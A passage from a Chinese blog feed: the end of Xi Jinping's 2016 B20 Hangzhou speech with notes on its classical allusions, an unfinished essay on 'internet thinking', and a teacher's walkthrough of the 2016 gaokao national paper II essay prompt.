中国的发展得益于国际社会，也愿为国际社会提供更多公共产品。我提出“一带一路”倡议，旨在同沿线各国分享中国发展机遇，实现共同繁荣。丝绸之路经济带一系列重点项目和经济走廊建设已经取得重要进展，21世纪海上丝绸之路建设正在同步推进。我们倡导创建的亚洲基础设施投资银行，已经开始在区域基础设施建设方面发挥积极作用。</p><p>　　我想特别指出，中国倡导的新机制新倡议，不是为了另起炉灶，更不是为了针对谁，而是对现有国际机制的有益补充和完善，目标是实现合作共赢、共同发展。中国对外开放，不是要一家唱独角戏，而是要欢迎各方共同参与；不是要谋求势力范围，而是要支持各国共同发展；不是要营造自己的后花园，而是要建设各国共享的百花园。</p><p>　　我们落实上述改革发展举措的决心是坚定的。这些举措已经初见成效。今年上半年，中国经济增长6.7%，产业升级和结构调整步伐加快，最终消费支出对国内生产总值的贡献率达到73.4%，第三产业增加值占到国内生产总值的54.1%，居民收入稳定增长，城镇新增就业717万人。可以相信，中国的发展前景一定会越来越好，对世界的贡献一定会越来越大！</p><p>　　女士们、先生们、朋友们！</p><p>　　当前，世界经济在深度调整中曲折复苏，正处于新旧增长动能转换的关键时期。上一轮科技和产业革命提供的动能面临消退，新一轮增长动能尚在孕育。现在，保护主义抬头，国际贸易和投资低迷，多边贸易体制发展面临瓶颈，区域贸易安排丛生，导致规则碎片化。地缘政治因素错综复杂，政治安全冲突和动荡、难民危机、气候变化、恐怖主义等地区热点和全球性挑战，对世界经济的影响不容忽视。</p><p>　　面对当前世界经济的复杂形势和风险挑战，国际社会对二十国集团、对杭州峰会抱有很高期待。在去年二十国集团领导人安塔利亚峰会上，我提出要对世界经济把准脉、开好方。中方希望同各方一道，推动杭州峰会开出一剂标本兼治、综合施策的药方，推动世界经济走上强劲、可持续、平衡、包容增长之路。</p><p>　　第一，建设创新型世界经济，开辟增长源泉。创新是从根本上打开增长之锁的钥匙。以互联网为核心的新一轮科技和产业革命蓄势待发，人工智能、虚拟现实等新技术日新月异，虚拟经济与实体经济的结合，将给人们的生产方式和生活方式带来革命性变化。这种变化不会一蹴而就，也不会一帆风顺，需要各国合力推动，在充分放大和加速其正面效应的同时，把可能出现的负面影响降到最低。</p><p>　　中方把创新增长方式设定为杭州峰会重点议题，推动制定《二十国集团创新增长蓝图》，目的就是要向创新要动力，向改革要活力，把握创新、新科技革命和产业变革、数字经济的历史性机遇，提升世界经济中长期增长潜力。这是二十国集团首次围绕创新采取行动，我们要把各国实施创新政策的力量汇集一处，做到理念上有共识、行动上有计划、机制上有保障。我们要针对全球经济增长低迷的突出问题，在宏观经济政策上进行创新，把财政货币和结构性改革政策有效组合起来。</p><p>　　第二，建设开放型世界经济，拓展发展空间。世界经济发展的历史证明，开放带来进步，封闭导致落后。重回以邻为壑的老路，不仅无法摆脱自身危机和衰退，而且会收窄世界经济共同空间，导致“双输”局面。</p><p>　　“轻关易道，通商宽农。”这是建设开放型世界经济的应有之义。中方把贸易和投资摆上二十国集团重要议程。我们推动二十国集团加强贸易和投资机制建设，制定全球贸易增长战略和全球投资指导原则，巩固多边贸易体制，重申反对保护主义承诺。我们希望通过这些举措，为各国发展营造更大市场和空间，重振贸易和投资这两大引擎。</p><p>　　第三，建设联动型世界经济，凝聚互动合力。在经济全球化时代，各国发展环环相扣，一荣俱荣，一损俱损。没有哪一个国家可以独善其身，协调合作是必然选择。我们要在世界经济共振中实现联动发展。</p><p>　　我们应该加强政策规则的联动，一方面通过宏观经济政策协调放大正面外溢效应，减少负面外部影响，另一方面倡导交流互鉴，解决制度、政策、标准不对称问题。我们应该夯实基础设施的联动，中方发起全球基础设施互联互通联盟倡议，推动多边开发银行发表联合愿景声明，加大对基础设施项目的资金投入和智力支持，以加速全球基础设施互联互通进程。我们应该增进利益共赢的联动，推动构建和优化全球价值链，扩大各方参与，打造全球增长共赢链。</p><p>　　第四，建设包容型世界经济，夯实共赢基础。消除贫困和饥饿，推动包容和可持续发展，不仅是国际社会的道义责任，也能释放出不可估量的有效需求。据有关统计，现在世界基尼系数已经达到0.7左右，超过了公认的0.6“危险线”，必须引起我们的高度关注。同时，全球产业结构调整给不同产业和群体带来了冲击。我们要正视和妥善处理这一问题，努力让经济全球化更具包容性。</p><p>　　为实现上述目标，今年二十国集团首次把发展问题置于全球宏观政策框架核心位置，首次就落实2030年可持续发展议程制定行动计划，首次就支持非洲国家和最不发达国家工业化开展合作，具有开创性意义。各方一致承诺推动气候变化《巴黎协定》尽快生效。我们还就能源可及性、能效、可再生能源、创业制定共同行动计划，加强粮食安全和农业合作。我们关心不同阶层和群体特别是困难群众的需求，推动各国讨论公共管理和再分配政策调整。</p><p>　　我们希望向国际社会传递这样一个信号：二十国集团不仅属于二十个成员，也属于全世界。我们的目标是让增长和发展惠及所有国家和人民，让各国人民特别是发展中国家人民的日子都一天天好起来！</p><p>　　女士们、先生们、朋友们！</p><p>　　一个行动胜过一打纲领。二十国集团成员应该同国际社会一道坚定信念、立即行动，从以下方面作出努力。</p><p>　　第一，共同维护和平稳定的国际环境。历史一再证明，没有和平就没有发展，没有稳定就没有繁荣。各国安全紧密相关，没有哪个国家可以独善其身，也没有哪个国家可以包打天下。抛弃过时的冷战思维，树立共同、综合、合作、可持续的新安全观是当务之急。我们呼吁各国珍惜难能可贵的和平和安宁，为维护全球和地区稳定发挥建设性作用。各国都应该坚持联合国宪章宗旨和原则，坚持多边主义，通过对话协商解决分歧和争端，寻求而不是破坏共识，化解而不是制造矛盾，推动国际秩序朝着更加公正合理的方向发展。</p><p>　　和衷共济、和合共生是中华民族的历史基因，也是东方文明的精髓。中国坚定不移走和平发展道路。国强必霸的逻辑不适用，穷兵黩武的道路走不通。中国是联合国安理会常任理事国中派遣维和人员最多的国家，不久前在马里和南苏丹牺牲的联合国维和人员中就有中国人民的优秀儿子。我们将继续履行好国际义务，始终做世界和平的建设者和维护者。</p><p>　　第二，共同构建合作共赢的全球伙伴关系。在经济全球化的今天，没有与世隔绝的孤岛。同为地球村居民，我们要树立人类命运共同体意识。伙伴精神是二十国集团最宝贵的财富，也是各国共同应对全球性挑战的选择。</p><p>　　我们应该求同存异、聚同化异，共同构建合作共赢的新型国际关系。国家不论大小、强弱、贫富，都应该平等相待，既把自己发展好，也帮助其他国家发展好。大家都好，世界才能更美好。</p><p>　　我们应该加强在重大全球性问题上的沟通和协调，为实现世界和平、稳定、繁荣提供更多公共产品。我们应该建立健全宏观经济政策协调机制，考虑国内政策的联动效应和传导影响，推动正面而非负面溢出效应。我们应该以伙伴关系为依托，秉持共赢理念，加强各领域务实合作，不断扩大合作内涵和外延，推动取得符合人民期待的合作成果。我们应该促进不同国家、不同文化和历史背景的人们深入交流，增进彼此理解，携手构建人类命运共同体。</p><p>　　第三，共同完善全球经济治理。常言说，小智治事，大智治制。面对世界经济形势的发展演变，全球经济治理需要与时俱进、因时而变。全球经济治理应该以平等为基础，更好反映世界经济格局新现实，增加新兴市场国家和发展中国家代表性和发言权，确保各国在国际经济合作中权利平等、机会平等、规则平等。</p><p>　　全球经济治理应该以开放为导向，坚持理念、政策、机制开放，适应形势变化，广纳良言，充分听取社会各界建议和诉求，鼓励各方积极参与和融入，不搞排他性安排，防止治理机制封闭化和规则碎片化。全球经济治理应该以合作为动力，全球性挑战需要全球性应对，合作是必然选择，各国要加强沟通和协调，照顾彼此利益关切，共商规则，共建机制，共迎挑战。全球经济治理应该以共享为目标，提倡所有人参与，所有人受益，不搞一家独大或者赢者通吃，而是寻求利益共享，实现共赢目标。</p><p>　　当前形势下，全球经济治理特别要抓住以下重点：共同构建公正高效的全球金融治理格局，维护世界经济稳定大局；共同构建开放透明的全球贸易和投资治理格局，巩固多边贸易体制，释放全球经贸投资合作潜力；共同构建绿色低碳的全球能源治理格局，推动全球绿色发展合作；共同构建包容联动的全球发展治理格局，以落实联合国2030年可持续发展议程为目标，共同增进全人类福祉！</p><p>　　二十国集团领导人峰会已经举行10届，正处在关键发展节点上。中方主办杭州峰会的目标之一，是推动二十国集团实现从短期政策向中长期政策转型，从危机应对向长效治理机制转型，巩固其作为全球经济治理重要平台的地位。</p><p>　　女士们、先生们、朋友们！</p><p>　　工商界是促进增长的生力军。中方把工商峰会安排在领导人峰会前夕举行，就是要充分汇集工商界的思想和智慧。我高兴地看到，二十国集团工商界人士积极参与全年会议进程，同其他各界人士一道，针对二十国集团关注重点，围绕金融促增长、贸易和投资、基础设施建设、中小企业发展、就业、反腐败等议题提出意见和建议，为二十国集团政策制定提供了重要参考，为杭州峰会作出了积极贡献。</p><p>　　女士们、先生们、朋友们！</p><p>　　这几天，正值钱塘江大潮，“弄潮儿向涛头立。手把红旗旗不湿。”我同各位一样，期待着二十国集团勇做世界经济的弄潮儿。相信在各方一道努力下，杭州峰会一定能够取得成功！</p><p>　　最后，我祝这次工商峰会取得圆满成功！</p><p>　　谢谢大家。　　</p><h1 id="国学解读"><a href="#国学解读" class="headerlink" title="国学解读"></a>国学解读</h1><p>  刚刚结束的杭州B20峰会（二十国集团工商峰会）开幕式上，习近平发表主旨演讲，善于明引、暗引、化用中国典故的风格再次得到展现。</p><p>  一开始，他介绍杭州“是中国的一个历史文化重镇和商贸中心，有千年以上的历史。千百年来，从白居易到苏东坡，从西湖到大运河，杭州的悠久历史和文化传说引人入胜”，谈到这里的生态时，就用了“晴好雨奇”的暗典，</p><blockquote><p>语出苏东坡的《饮湖上初晴后雨》第二首：水光潋滟晴方好，山色空蒙雨亦奇。欲把西湖比西子，淡妆浓抹总相宜。</p></blockquote><p>  随后，谈到中国正坚定不移推进公平共享，增进更多民众福祉时，</p><blockquote><p>引用了《尚书•五子之歌》中的“民惟邦本，本固邦宁”。原文为“皇祖有训，民可近不可下，民惟邦本，本固邦宁。”通俗解释为：祖先早就传下训诫，人民是用来亲近的，不能轻视与低看；人民才是国家的根基，根基牢固，国家才能安定。——注意，他已经多次用到这句话，表达治国需以民为本的理念。</p></blockquote><p>  在谈到二十国集团的议事宗旨时，他用了</p><blockquote><p>“轻关易道，通商宽农” ，语出《国语•晋语四》，本义为减轻赋税，清除盗贼，以宽松的环境刺激农商业发展。</p></blockquote><p>  用在这里，意在呼吁建设开放型世界经济，巩固多边贸易体制，反对贸易保护主义。</p><blockquote><p>“和衷共济、和合共生是中华民族的历史基因，也是东方文明的精髓。中国坚定不移走和平发展道路。国强必霸的逻辑不适用，穷兵黩武的道路走不通。”习近平提到的“和合”，在中华传统文化中的内涵就更丰富了，君臣、兄弟、夫妻、邻里、邦国之间皆可讲，指的是和谐、和睦、同心协力，合作共生。中国民间传说中，还有和合二仙，算是喜神，主管婚姻家庭和美的，从宋代就开始祭祀。</p></blockquote><p>  在谈到“共同完善全球经济治理”时，习近平用了“小智治事，大智治制”一语，这句话也不是他第一次在正式场合用到。2014年10月23日他在在中共十八届四中全会第二次全体会议上，也使用了这句话，</p><blockquote><p>稍不同的是“小智治事，中智治人，大智立法”，重点表达了治理一个国家、一个社会，关键是要立规矩、讲规矩、守规矩。</p></blockquote><p>  有兴趣的朋友，可以去搜搜这句话到底出处在哪里。</p><p>  当然，习近平在B20峰会开幕式上的演讲，结尾处的用典更是精心准备。他说：“这几天，正值钱塘江大潮，中国有个诗句‘弄潮儿向涛头立，手把红旗旗不湿。’我同各位一样，期待着二十国集团勇做世界经济的弄潮儿。”</p><p>  在中国，表扬一个人勇敢进取、敢闯敢干、总是站在时代前列，有个词叫“弄潮儿”。熟悉杭州的人都知道，钱塘江大潮是一道著名的风景，每年农历八月十八，钱塘江涌潮最大，潮头可达数米。杭州、海宁一带，中秋时节观赏钱塘江大潮，历史悠久，早在汉、魏、六朝时就已蔚成风气，至唐、宋时，此风更盛。南宋朝廷曾规定，农历八月十八这天，要在钱塘江上校阅水师，以后相沿成习。</p><p>  习近平所引用的这首诗，原创为北宋诗人潘阆的《酒泉子》：</p><blockquote><p>长忆观潮，满郭人争江上望。来疑沧海尽成空，万面鼓声中。弄潮儿向涛头立，手把红旗旗不湿。别来几向梦中看，梦觉尚心寒。</p></blockquote><p>  这首词描写了杭州人倾城而出，拥挤钱塘江边，万头攒动的盛况，江面潮水上涨，气势磅礴，有如万面鼓声。而更让人心生豪迈的是，如此惊险壮观的风光下，弄潮的少年搏击风浪，身手不凡，履险如夷。如此弄潮儿，怎能不让人目为英雄，既敬且爱？</p><blockquote><p>这首词以豪迈的气势和劲健的笔触，描绘了钱江潮涌的壮美风光。词的上片描写观潮盛况，表现大自然的壮观、奇伟；下片描写弄潮情景，表现弄潮健儿与大自然奋力搏斗的大无畏精神，抒发出人定胜天的豪迈气概。<br>　上片起首两句，写杭州人倾城而出，拥挤钱塘江边，万头攒动，争看江面潮水上涨。为下面潮水的涌现制造了气氛，作好了铺垫。上片结尾两句，运用比喻、夸张等手法，把钱江潮涌的排山倒海、声容俱壮，渲染得有声有色、惊险生动。<br>　过片转而描写弄潮儿的英勇无畏、搏击风浪、身手不凡和履险如夷。这两句纯用白描手法，写得有声有色，富于动感，眩目惊心。结拍由回忆转为现实，写词人虽离杭已久，但那壮观的钱江涌潮仍频频入梦，以至梦醒后尚感惊心动魄。<br>　此词对于钱江涌潮的描绘，可谓匠心独远，别具神韵。词中“来疑沧海尽成空”一句采用夸张手法，浓墨重彩，大开大阖，感染力甚强。上片第二句的“争”、“望”二字，生动地表现了人们盼潮到来的殷切心情，从空间广阔的角度进行烘托与大潮的壮观结合得甚为密切。结拍言梦醒后尚心有余悸，更深化了潮水的雄壮意象。前后的烘托与中间重点描写当中的夸张手法配合紧密，使全词的结构浑然一体。</p></blockquote><p>  现在能搜到最早将“弄潮儿”写进诗中的，似是</p><blockquote><p>唐朝诗人李益的《江南曲》，以一个少妇口吻，表达了与其嫁个有钱人天天在宝马车里哭，不如嫁个“弄潮儿”的幽怨：<br>“嫁得瞿塘贾，朝朝误妾期。早知潮有信，嫁与弄潮儿。”</p></blockquote><p>  陆游的《一落索》云：“识破浮生虚妄。从人讥谤。此身恰似弄潮儿，曾过了、千重浪。”晁说之律诗《无题》有“身世何如荐福碑，浮沉聊学弄潮儿”之句。明徐渭《八月十八日阿枳三江观潮夜归示》云：“闻道黄熊伯子宫，银山银海走银虹。千花竞蹙鱼龙后，万里长来日月东。河伯正骄秋水舌，非神亦弄广陵风。莲姬自爱潮多信，看弄潮儿欲嫁侬。”清人袁枚的长诗《到石梁观瀑布》有“我本钱塘儿弄潮，到此使人意也消，心花怒开神理超”，钱名世《观潮》有“弄潮吴儿好身手，蓦波燕跃伸黄头”，慌遵宪《九姓渔船曲》有“相当应嫁弄潮儿，不然便逐浮梁贾”。关于弄潮儿的诗句，可以说在历代文人骚客的诗篇中不胜枚举，唐人李益是不是首创，抑或弄潮儿这个词最早从何而来，还重要吗？</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>土豆漫谈互联网思维</title>
      <link href="/2016/Potato-Talk-About-Internet-Think/"/>
      <url>/2016/Potato-Talk-About-Internet-Think/</url>
      <content type="html"><![CDATA[<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>互联网思维，就是————</p><p>1.数据驱动运营。<br>2.用户体验至上。<br>3.创新快速迭代。</p><h1 id="起始"><a href="#起始" class="headerlink" title="起始"></a>起始</h1><p>  工业革命在最近的几个世纪中推动了生产力的发展与生产效率的大幅提高，促进了人类劳动力的解放。农业文明时代，最重要的资产是土地跟农民，工业时代最重要的资产是资本、机器（机器是固化的资本）、流水线上被异化了的人。工业时代早期考虑最多的是异化的人，因为人也被当作机器在处理，人只是流水线当中的螺丝钉。当人类生产力获得解放，同时收入提高时，人们的欲望与需求便成几何倍数的增长。于是，在发展生产与信息交换、人类欲望的多重的推动下，互联网便诞生了，信息的交换变得越来越频繁。<br>  举个例子：从前，我们上班时的事情或许就是每天接电话联系业务同时在周末或者月末用报表与上级沟通并完成任务，信息流通极为缓慢，这样，便出现了依赖信息不对称盈利的模式。今天，我们上班使用QQ、微信与同事、客户联系，事实与领导汇报各种可能存在的问题与数据，一天不刷知乎、头条、微博便觉得跟不上时代。淘宝每一秒的交易数据都可以直观实时的呈现于后台，便于老板掌控相关情况。<br>  海量信息汇集在各个开放平台,人们可以随时随地、全面了解任何一个东西，故靠<em>信息不对等、一锤子买卖的盈利模式</em>一去不复返。任何一款产品要站住脚，必须形成严密的闭环即<em>“出现-体验-服务-优化”</em>。当今流行的性价比消费文化迫使产品不得不削减成本、牺牲利润，以形成<em>更高的性价比来换取用户规模</em>，这就促使了一种新的商业模式的产生————用户即利润。</p><h1 id="初期：互联网思维的雏形"><a href="#初期：互联网思维的雏形" class="headerlink" title="初期：互联网思维的雏形"></a>初期：互联网思维的雏形</h1><p>  当互联网思维的萌芽刚刚冒出大地时，便是传统销售业与工业遭到冲击的时候。初期，部分领先的品牌为了塑造品牌形象来获取更高的用户关注度，采取了以下两种模式：</p><p>  1.品牌包装：品牌包装，顾名思义就是塑造一个自己的品牌，对它进行多方面的<em>切合消费实际</em>的宣传，并进一步更新自己的产品实际，使之尽可能的贴合用户需求，给用户创造最大化的便利、价值与最好的使用体验。品牌包装的核心主要有两个方面，一个是品牌自身的建设，即品牌产品外观设计，另外一个是品牌外部的推广。<br>  2.开源节流：开源节流包括渠道下沉与成本控制两个方面。</p><p>  渠道下沉：一个经典案例<a href="http://www.meihua.info/a/54996" target="_blank" rel="noopener">“发”动新冲锋：欧莱雅品牌渠道下沉战略</a><br>  渠道是产品由生产者到用户的流通过程各个环节连接起来形成的通道，特定的渠道只在特定环境下体现价值。实践中，企业所处的技术、产品、市场竞争、行业发展、经销商能力、消费者特性等经营条件时刻发生变化，企业在不同产品生命周期、不同产品品类推出期、不同消费时段也存在不同竞争状况，种种现实动因要求企业渠道转换，尤其在发生渠道冲突、进行成本控制、转化渠道模式和扩大市场时，企业渠道转换决策需求尤为迫切。<br>  产品的同质化日趋严重，价格竞争愈演愈烈，渠道优势正在成为企业竞争中的持久性优势。企业渠道不能墨守成规，在企业生存的内外部条件发生变化时，采取可行的渠道转换决策。</p><p>  成本控制是企业根据一定时期预先建立的成本管理目标，由成本控制主体在其职权范围内，在生产耗费发生以前和成本控制过程中，对各种影响成本的因素和条件采取的一系列预防和调节措施，以保证成本管理目标实现的管理行为。<br>  成本控制的过程是运用系统工程的原理对企业在生产经营过程中发生的各种耗费进行计算、调节和监督的过程，同时也是一个发现薄弱环节，挖掘内部潜力，寻找一切可能降低成本途径的过程。科学地组织实施成本控制，可以促进企业改善经营管理，转变经营机制，全面提高企业素质，使企业在市场竞争的环境下生存、发展和壮大。</p><h1 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h1><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>  <a href="http://www.woshipm.com/tag/互联网思维" target="_blank" rel="noopener">http://www.woshipm.com/tag/互联网思维</a><br>  <a href="https://www.zhihu.com/question/19992568" target="_blank" rel="noopener">https://www.zhihu.com/question/19992568</a><br>  各种wiki……<br>  <a href="http://wiki.mbalib.com/" target="_blank" rel="noopener">http://wiki.mbalib.com/</a><br>  受昆明电台FM100.8启发，作此文</p>]]></content>
      
      
        <tags>
            
            <tag> School </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2016高考全国2卷作文：语文素养_解析</title>
      <link href="/2016/2016CET-II-Essay/"/>
      <url>/2016/2016CET-II-Essay/</url>
      <content type="html"><![CDATA[<p>2016高考新课标全国2卷语文试题解析</p><p><em>新东方在线 甄丽鹤</em></p><h1 id="Going"><a href="#Going" class="headerlink" title="Going"></a>Going</h1><p>  首先进行第一部分，审题和解析。材料是说语文关系到国家的软实力和文化自信，对于中学生来说有三个途径，课堂的教学和实践和实习。要求一：根据材料从自己的语文学习出发，还有写作的具体要求。不少于800字。这时候我们要做到第一步，肯定是审题和立意，但是没有告诉你审题和立意的标准是什么。我们需要做到两个词：全面和深刻。但如何全面和深刻呢?也是接下来我在带你解析的时候尝试的两个方面。</p><p>  接下来首先我们看到了材料当中的一个非常重要的名词，叫做国家软实力。国家软实力有个相关的新闻，说近十年中国的经济GDP在十年间从全球的第六位，上升到了全球第二位，但是我们的文化软实力并没有跟我们的经济实力一样，保持一个双向猛劲的态势。相反如果我们着眼于亚洲的话，韩国和日本的文化软实力在全球的比重占到了13%，而我们中国加上亚洲的其他国家，占的比重仅为6%，也就是说中国这么大的一个国家，和其他的亚洲小国加起来，整个的文化软实力是6%，是极低的分数。除此之外的话我们发现如果说我们中国与欧盟文化强国做一个比较的话，我们的文化的实力可能是1：100这样的比例。可见我们在文化，在国家软实力方面还有非常强劲的努力目标，这是我们在整个材料当中看到的第一个词，国家软实力。这是从新闻的角度做了解析。</p><p>  接下来我们再往下看第二个名词，可能你看到的第二个名词跟老师一样，叫做文化自信。什么叫文化自信?文化自信应该是一个国家整体的面貌，我们从一则新闻引入。十八大以来习近平总书记在多个场合谈到了传统文化，表达了对传统文化的尊崇。他多次提到了文化价值观和文化自信，在国内外的不同的场合中展现了中国政府与人民精神志气的提振。新闻稿可能从国家整体的政策方面阐述的，其实这个作文是将我们同学的学习语文的整体的大的要求，放到了国家政策的层面。这其实是我们到最终尝试的一个结果，或者说我们最终努力的结果。</p><p>  在读材料的时候我们关键看到这两个词，一个叫国家软实力，一个叫做文化自信。刚才老师从政策的层面对这两个名词做了解析。</p><p>  接下来对于中学生来说语文的素养提升有三个途径，第一个是课堂的有效教学，第二个是大量课外阅读，第三个是社会生活的实践。你谈国家层面的话永远不是高考命题人给你的要求。为什么?钓鱼岛问题和台湾问题你解决不了，空谈国家政策又有什么意义呢?当然最开始把这个大的话题放在国家政策的背景上，是让你承担责任的，你得努力，我们能做到文化软实力的进步，才能做到文化的强大自信。我们看看怎么努力呢?接着往下看。</p><p>  我们要根据那三个途径努力的话，第一点，在课堂上面提升语文素养。第二，就是课堂是一方面，还要做大量的课外阅读的补充。第三点社会实践，就不太清楚应该怎么做了。于是这时候才是我要带你解析的一个大的方向。</p><p>  首先我们先来明确立意的原则，第一就是全面和深刻。你不能看到这个材料的第一句，叫做国家软实力和文化自信就可以先开始了，空谈国家政策是不够接地气的，是忽略了现在高考命题人对于学生从自身出发的考察。第二就是多角度的辨析，尽可能全面和成熟的看待这个问题，要发现问题和解决问题。这是对立意和审题原则的要求。</p><p>  第二是原则的要求。你是语文课堂的实际参与者，这时候在我们课本上面学习了非常精彩的大量的课文，学习这些课文的过程当中一定要你有提升。提升的角度是什么呢?我简单写了一个途径一的立意角度，叫做课本中积淀百年，乃至千年的古诗文是精神的洗礼和升华，课堂是语文素养提升的前沿阵地，然而目前的学习情况伴随着方法僵化、形式不创新等问题，兴趣的启发非常重要，切记一定要守住阵地。</p><p>  刚才老师说了语文课本是非常重要的，在这个重要的过程中我们发现主要是通过课本的形式学习的，你看到的古诗文和散文，其实是从多角度，从文学素养的角度，从独立思考问题的角度对我们做了提升，这时候我们非常感谢它。但是你知道学习的形式也非常重要，我们目前存在的问题就是学习形式的问题，只有形式好了之后你才会关注内容，可能没有好的形式，在内容方面也会有特别大的问题。所以我们最终的目标是提升语文素养。第一个途径“课堂的有效教学“能够提供给我们语文素养特别大的明确的几条路，与此同时我们发现它伴随着问题。作为18岁的成熟少年，你要有能够解决问题的一些方法和技巧。而这时候我们必须要解决的就是方法僵化怎么办，形式不创新又怎么办，这是第一个角度。</p><p>  接下来看看第二个角度“大量的课外阅读“。在我上周末班的时候有一次我们讲作文时遇到了一个话题，我们谈到了一本书，这本书现在在京东网上非常畅销，叫《摆渡人》。这个话题也是2016年海淀一模的题目，讲的是摆渡人带领小女孩走出人生困境的题目。其实我在讲的时候我们没有想到我班里的学生那么受影响，下一周上课的时候我发现我班里的很多同学在课间休息的时候在读这本书。有些是纸制的，有些是电子书。还有同学跟我交流说”老师，这本书我看完了，有一种欲罢不能的感觉，看的速度特别快。“其实你会发现大量的课外阅读是我们课堂有效教学的有力补充，而选到一本非常好的阅读材料也是非常之关键。这时候我们就必须要依靠一些在专业方面非常有经验的老师，或是家长，或是家族当中的长辈，他们来对我们有一个指导性的作用。所以我刚才阐述清楚了，大量的课外阅读对于我们整个语文素养提升的一个重要的例子，那么我在这个角度应该注重阐述什么呢?有的时候我们评价一个学生，有些学生显得比较成熟，而且是超乎他年龄段的成熟。有些学生比较单纯一点。这时候老师给你提供一个特别大的方向，这个方向不仅是我们认识问题的方向，也是我们写作文的过程当中一个非常重要的立意方向。人们常说人生有一个境界，第一个境界叫做看山是山，看水是水。老师和家长把对于世界的人事教给你，你认为他们的话一定是对的。而等你慢慢长大的时候，你开始接触社会，自主思考问题，你就会变得看山不是山，看水不是水，这是人生的第二重境界。这是成长中的必经阶段，有进步，也会有偏激的思考，这时候你应该努力的充实自己，让自己变成一个独立人格，成熟思维的人。于是我们努力达到人生的第三重境界，看山还是山，看水还是水。举个例子，你小时候喜欢谁就是喜欢谁，但等你慢慢长大之后你发现，你还是很喜欢他，但是你能坦然接受你人生的不完美，你能坦然接受人生的失败，这就是第三种境界。</p><p>  所以大量的阅读的输入，才是我们看问题非常重要的基本实例。所以我们打响的阅读的输入是我们的资本，阅读是青少年和世界进行灵魂交流的方式，阅读可以让我们长大和独立，所以阅读一定非常重要。这是第二个角度。</p><p>  接下来是第三个角度。甄丽鹤老师对审题和立意的要求，是要全面和深刻。刚才如果只谈两个角度，如何做到全面呢?也许第三个跟前两个有非常密切的关系，如果不谈第三个就做不到深刻，一定要记住老师在解析前对你的叮嘱，全面和深刻的审题和立意。</p><p>  第三个角度其实是一个难点，叫做社会生活实践。你先不要看老师给你写的立意角度，先听老师讲。什么叫做社会生活的实践呢?我学语文跟社会生活实践有什么关系呢?我怎么思考一下我平时的语文学习和生活实践之间的关系呢?接下来我告诉你一个方向。社会实践是将语文学习和生活结合的最好范例。我们常说你在平时的学习过程当中，学到的知识，可能在生活当中不能直接的应用，但语文是可以这样的。我们有一句话叫做语文的外延和生活相等，生活有多宽广，语文就有多宽广。高考的改革过程当中，江苏、北京、上海都朝着这个方向努力。所以北京高考的同学才会有特别大的感受，老师的题太活了，考对联等，这只是形式，但内容的话一定要求同学们能把语文跟生活做很好的结合。<br>  接下来是两个范例，第一个范例是春节时拟春联和写春联。其实我们的多数的时候，你过年的时候贴的春联一定是从街上买的，这时如果你在对于传统文化的关注的基础上，进行了语文素养的提升，你自己本身就有着想要写春联的冲动。这就是很好的参与社会实践的一种形式。你能拟春联，还能用毛笔字写出来，是你的墨宝，还能按正确的方式贴在你家门口，右为上，左为下。这是春节的时候写春联的文化素养和社会实践相结合的例子。</p><p>  除此之外北京有一个三联书店，现在还有两家店，一家在东城区，另外一家在全国著名的高校集中地，五道口。那么我代课的小区是大钟寺、东四和魏公村。每周日的晚上在东四下课的时候，我就带着我上课的资料来到三联书店，楼上是24小时的咖啡店，雕刻时光。在这个时候静静坐下来，把这周整体的教学思路理一遍，看看哪些地方做修改，看看哪些地方做强化和完整，基本上每周日的晚上我都这样渡过的。做完了之后下楼梯来到三联书店，这时候我就会发现原来有着很多和我一样晚归的人，他们在静静的选书。</p><p>  李克强总理在2014年三联书店刚刚在东城开第一家店的时候，就专门提到了这个问题，他说非常感谢能够有一个这样24小时精神的书社，能让大家在闲暇之余参与到阅读的状态。你发现这个书店玻璃的大墙下面有很多小方桌，有两盏台灯，桌子虽然小，但是阅读的人非常多。我们还可以提到来自于2015年，北京市西城区的高三的期中考试的一篇文章，叫做“这里的世界只剩下一种人”，就是以东城区的三联书店为写作模板。三联书店分有两层，地上和地下。在地上和地下有一个连接的地方，在12点的时候仍然有非常多的人，静静的坐在一个台阶上，非常如饥似渴的阅读。这时候你会发现这难道不是参与语文的素养和社会实践的一种方式吗?而且三联书店也会定期举办非常好的读书分享会，这都是非常好的实践形式。</p><p>  说完了三个大的角度，我们就做到了对作文的全面和深刻的解读。如果我们只是写成三段式的排比作文，结构就太简单了。但你是18岁的成熟的少年，作为一个看问题深刻的，能解决问题的高考的合格考生来说，你这样写的话会被人笑话。到最后一定要统一起来，叫做思辨的结合与统一。作为青少年你有着修身齐家治国平天下的要求，自身素养的提升非常重要，文化自信的责任、文化软实力的责任是在你的身上。这时候我们就发现如果说你不能够做到对于自己的这种学习的一个要求的话，那么你怎么能够做到修身，进而齐家，进而治国，进而平天下的大责任呢?</p><p>  紧接着，最后的中心论点也就呈现出来了。</p><p>  首先我们看到第一部分是一个大的政策角度。我们国家需要软实力的提升，我们需要强大的文化自信。这时候作为一个成熟的少年，你需要通过提升语文素养的方式与国家强大的软实力和强大的文化自信接轨，这时候你空有理想，不知道怎么做，那么作文的材料当中给你提了三个途径，课堂的有效教学，大量的课外阅读，社会生活的实践。课堂的有效教学对我提升语文素养来说有什么意义呢?我刚才告诉了你素养的意义，非常优美的散文，思想非常深刻的古诗文，还有观点非常鲜明的议论文，其实是在启迪我们的思想。这时候我们也会敏锐的发现问题。问题就是很多同学把语文课当成了写其他作业的课，甚至是睡觉的课，这一定不行。我们往深入思考的话，一定是教学形式的问题。所以这时候我们要采用多种多样的教学形式，来激发你的学习兴趣，这是我们提升语文基本素质的一块非常重要的阵地，我们不能抛开这个阵地的。</p><p>  第二个角度是大量的课外阅读，会提高我们看问题的能力。这时候必须要做到大量的课外阅读，让自己变成能在人生的第三重境界，看山还是山，看水还是水的角度。</p><p>  第三个角度是社会生活的实践，语文学好了能让你写出春联，除此之外参加大量的读书分享会也是非常好的，参与娱乐实践的形式。</p><p>  总而言之，到最后我们必须要到这个层面上，作为青少年你身上是有责任的，你有修身齐家治国平天下的责任，不是空想的，一定是提升自身素养的基础上，进行极大的努力，这时候我们才有文化自信的责任、文化软实力的责任，放到自己的身上，这时候必须要加油。</p><h1 id="Referrence"><a href="#Referrence" class="headerlink" title="Referrence"></a>Referrence</h1><p><a 